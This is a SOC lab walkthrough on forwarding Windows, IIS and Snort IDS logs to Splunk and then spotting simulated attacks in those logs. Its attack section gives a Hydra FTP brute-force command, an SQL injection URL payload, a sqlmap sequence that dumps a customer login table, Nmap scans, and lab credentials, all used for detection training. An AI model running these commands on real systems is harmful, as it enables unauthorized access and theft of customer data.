# Centralized Logging: Collecting Logs from Different Devices Using Splunk

Monitoring and analyzing log files on individual devices locally is difficult and doesn't scale. Centralized logging solves this by aggregating logs from multiple sources into a single location, where a SOC analyst can view, monitor, and correlate events in real time.

In this lab, we configure **Splunk Universal Forwarders** on a Web Server and a User Machine to forward Windows Event Logs, IIS logs, and Snort IDS logs to a central **Splunk Enterprise** instance on the Analyst Machine. We then simulate attacks (brute force, SQL injection, port scanning) from an Attacker Machine and verify that the resulting events are visible and searchable in Splunk.

## Lab Topology

| Machine | Role | IP Address |
|---|---|---|
| Analyst Machine | Splunk Enterprise (Indexer) | `10.10.10.16` |
| Web Server | Splunk Universal Forwarder + IIS + Snort | `10.10.10.12` |
| User Machine | Splunk Universal Forwarder | — |
| Attacker Machine | Attack traffic generation | — |

---

## 1. Install Splunk Universal Forwarder (Web Server)

1. Open **File Explorer** and navigate to `Downloads\Splunk Forwarder`.
2. Double-click `splunkforwarder-9.2.2-d76edf6f0a15-x64-release.msi`.

   ![Splunk Forwarder Install](../../images/logging/various-sources/splunkforwarderinstall.png)

3. In the **Splunk > Universal Forwarder** setup window:
   - Check the box to accept the license agreement.
   - Keep the default settings and click **Customize Options**.
4. Leave the installation path at its default and click **Next**.
5. Click **Next** on the Splunk certificate screen.
6. Select **Local System** to install the Universal Forwarder as a local system account, then click **Next**.
7. Check all entities under **Windows Event Logs** and **Performance Monitor**, then click **Next**.

   ![Select Entity](../../images/logging/various-sources/entity.png)

8. Create credentials for the Administrator account:
   - Username: `admin`
   - Uncheck **Generate random password**
   - Enter and confirm the password
   - Click **Next**
9. Leave the **Deployment Server** field blank and click **Next**.
10. Under **Receiving Indexer**, enter the Analyst Machine's details and click **Next**:
    - Hostname/IP: `10.10.10.16`
    - Port: `9997`
11. Click **Install**.

## 2. Install Splunk Universal Forwarder (User Machine)

Repeat the same installation steps on the User Machine so it can also collect and forward logs to the Analyst Machine.

## 3. Configure Log Collection on the Web Server

The forwarder needs explicit configuration to collect **IIS** and **Snort IDS** logs. All config files live in:

```
C:\Program Files\SplunkUniversalForwarder\etc\system\local
```

### 3.1 `inputs.conf` — Monitor IIS logs

Create `inputs.conf` in the folder above:

```ini
[monitor://C:\inetpub\logs\logfiles]
sourcetype = iis
ignoreOlderThan = 14d
host = WEBSERVER2022
```

### 3.2 `props.conf` — Parse IIS log format

Create `props.conf`:

```ini
[iis*]
pulldown_type = true
MAX_TIMESTAMP_LOOKAHEAD = 32
SHOULD_LINEMERGE = False
CHECK_FOR_HEADER = False
tz = GMT
REPORT-iisw3cfields = iisw3cfields
TRANSFORMS-removecomments = removecomments
```

### 3.3 `transforms.conf` — Field extraction & noise filtering

Create `transforms.conf`:

```ini
[default]
host = WEBSERVER2022

[ignore_comments]
REGEX = ^#.*
DEST_KEY = queue
FORMAT = nullQueue

[iis2]
DELIMS = " "
FIELDS = date, time, s-ip, cs-method, cs-uri-stem, cs-uri-query, s-port, cs-username, c-ip, cs(User-Agent), cs(Cookie), cs(Referer), cs-host, sc-status, sc-substatus, sc-win32-status, sc-bytes, cs-bytes, time-taken
```

### 3.4 Add Snort IDS monitoring

Append the following block to the existing `inputs.conf`:

```ini
[monitor://C:\Snort\log\*]
disabled = false
source = ids
sourcetype = snort_ids
```

### 3.5 Restart the forwarder service

Navigate to **Start → Windows Administrative Tools → Services**, then:

1. Select **SplunkForwarder Service**.
2. Click **Stop**, then **Start** to apply the new configuration.

## 4. Configure Splunk Enterprise (Analyst Machine)

1. Open **File Explorer** and navigate to `Downloads\Lab Prerequisites\Splunk Enterprise`.
2. Double-click `splunk-9.2.2-d76edf6f0a15-x64-release.msi` to begin installation.
3. Set the administrator credentials (`admin` / `admin@123`) and click **Next**.

   ![Set Splunk Enterprise Password](../../images/logging/various-sources/splunkEnterpisePassword.png)

4. Click **Install**. Splunk Enterprise will launch automatically in the default browser.
5. Log in using the credentials configured during installation.

   ![Start Splunk](../../images/logging/various-sources/splunkStart.png)

### 4.1 Enable a receiving port

1. From the Splunk home page, go to **Settings → Forwarding and receiving** (under **DATA**).
2. Under **Receive data**, click **Add new**.
3. Set **Listen on this port** to `9997` and click **Save**.

   ![Receiving Port](../../images/logging/various-sources/forwarder.png)

### 4.2 Enable the SplunkForwarder app

1. Click **Apps → Manage Apps**.
2. Locate **SplunkForwarder** and click **Enable** under **Status**.

   ![App Console](../../images/logging/various-sources/app-console.png)

3. Click **Edit Properties** (under **Action**) for the SplunkForwarder app.
4. Set **Visible** to **Yes** and click **Save**.

### 4.3 Restart Splunk

1. Go to **Settings → Server controls** (under **SYSTEM**).
2. Click **Restart Splunk**, then confirm with **OK**.
3. Log back in once the restart completes.
4. Click **Apps → SplunkForwarder** to open the search app.

   ![Splunk Forwarder](../../images/logging/various-sources/splunkForwarder.png)

## 5. Enable Logon Auditing (Web Server)

To capture successful and failed logon events, enable auditing via Local Security Policy:

1. Open **Search**, type `Local Security Policy`, and press **Enter**.
2. Expand **Local Policies → Audit Policy**.
3. Double-click **Audit logon events**.

   ![Configure Audit Logon](../../images/logging/various-sources/audit.png)

4. Check both **Success** and **Failure**, click **Apply**, then **OK**.
5. Close the Local Security Policy window.

## 6. Start Snort IDS (Web Server)

1. Open a command prompt and navigate to the Snort binary directory:

   ```
   cd C:\Snort\bin
   ```

2. Start Snort in IDS mode with full alert logging:

   ```
   snort -i4 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -A full
   ```

   ![Snort Start](../../images/logging/various-sources/snort.png)

## 7. Generate Attack Traffic (Attacker Machine)

With logging and monitoring active, the next step is to generate traffic that produces events across all three log sources: Windows Security, IIS, and Snort.

### 7.1 FTP brute-force attack (Hydra)

```
hydra -L '/root/Wordlist/userlist.txt' -P '/root/Wordlist/pass.txt' ftp://10.10.10.12
```

![Hydra Start](../../images/logging/various-sources/hydra.png)

Hydra cycles through the username/password lists and, after roughly 30 attempts, recovers a valid credential pair:

- **Username:** `Administrator`
- **Password:** `Pa$$w0rd`

Verify the credentials with a manual FTP login:

```
ftp 10.10.10.12
```

Enter `administrator` / `Pa$$w0rd` when prompted.

![FTP Login](../../images/logging/various-sources/ftplogin.png)

### 7.2 SQL Injection

1. Open Firefox and browse to `http://www.luxurytreats.com`.
2. Log in with:
   - **Username:** `bob`
   - **Password:** `Passw0rd`
3. Go to **My Orders** and open order `ORD-001`.
4. Modify the URL to inject a payload:

   ```
   http://www.luxurytreats.com/OrderDetail.aspx?Id=ORD-001' or 1=1;--
   ```

   This bypasses the query's logic and returns order details belonging to other users.

5. Automate exploitation with **sqlmap**:

   ```
   # Enumerate databases
   sqlmap -u "http://www.luxurytreats.com/orderdetail.aspx?Id=1" --dbs
   ```

   ![SQLMap Start](../../images/logging/various-sources/sqlmap1.png)

   sqlmap fingerprints the back-end (MS SQL Server), the web server OS, and the application stack, and lists the available databases.

   ```
   # Enumerate tables in the Hotels database
   sqlmap -u "http://www.luxurytreats.com/orderdetail.aspx?Id=1" -D Hotels --tables
   ```

   ![SQLMap Tables](../../images/logging/various-sources/sqlmap-tables.png)

   ```
   # Enumerate columns in CustomerLogin
   sqlmap -u "http://www.luxurytreats.com/orderdetail.aspx?Id=1" -D Hotels -T CustomerLogin --columns
   ```

   ![SQLMap Columns](../../images/logging/various-sources/sqlmap-col.png)

   ```
   # Dump table contents
   sqlmap -u "http://www.luxurytreats.com/orderdetail.aspx?Id=1" -D Hotels -T CustomerLogin --dump
   ```

   This confirms that the SQL injection vulnerability allows an attacker to exfiltrate sensitive customer data directly from the database.

### 7.3 Port and service scanning (Nmap)

```
# SYN scan
nmap -sS 10.10.10.12
```
![SYN Scan](../../images/logging/various-sources/syn.png)

```
# TCP full-connect scan
nmap -sT -T4 10.10.10.12
```
![TCP Scan](../../images/logging/various-sources/tcp.png)

```
# TCP NULL scan
nmap -sN -T4 -A -v 10.10.10.12
```
![NULL Scan](../../images/logging/various-sources/null.png)

```
# Xmas scan
nmap -sX -T4 10.10.10.12
```
![Xmas Scan](../../images/logging/various-sources/xmas.png)

```
# UDP scan
nmap -sU -T5 10.10.10.12
```

The UDP scan reveals port `137` open on the target.

## 8. Analyze the Logs in Splunk (Analyst Machine)

1. Open the **SplunkForwarder** app and click **Data Summary** under **How to Search**.

   ![Data Summary](../../images/logging/various-sources/image.png)

2. Select the host **WEBSERVER2022** from the host list to view all logs recorded for that machine.

   ![Host - WEBSERVER2022](../../images/logging/various-sources/image-1.png)

### 8.1 Windows Security logs — detect the brute-force attempt

1. Click **sourcetype** in the left pane and select **WinEventLog:Security**.

   ![WinEventLog Security](../../images/logging/various-sources/image-2.png)

2. Search for failed logons caused by the brute-force attempt:

   ```
   EventCode=4625 Sub_Status=0xC0000064 Status=0xC000006D
   ```

   | Field | Meaning |
   |---|---|
   | `EventCode=4625` | Failed logon attempt |
   | `Sub_Status=0xC0000064` | Username does not exist |
   | `Status=0xC000006D` | Logon failure — unknown username or bad password |

   ![Add Event](../../images/logging/various-sources/image-3.png)

### 8.2 IIS logs — trace the SQL injection request

1. Click **sourcetype** and select **iis**.

   ![IIS Logs](../../images/logging/various-sources/iis.png)

2. Locate the request containing the injected `OrderDetail.aspx` query string.

### 8.3 Snort IDS logs — confirm the intrusion alert

1. Click **sourcetype** and select **snort_ids**.
    ![Select snort_ids in sourcetype](../../images/logging/various-sources/image-7.png)
2. Filter for SQL injection–specific signatures and inspect the matching alert entries.

   ![SQL Injection Alert](../../images/logging/various-sources/image-6.png)

---

## Summary

This lab demonstrates the full centralized-logging workflow used in a SOC: forwarding Windows, IIS, and Snort logs from endpoints into Splunk, generating real attack traffic (FTP brute force, SQL injection, Nmap reconnaissance), and correlating the resulting events across log sources — from Windows Security logon failures, to IIS request logs, to Snort IDS alerts — all searchable from a single pane of glass.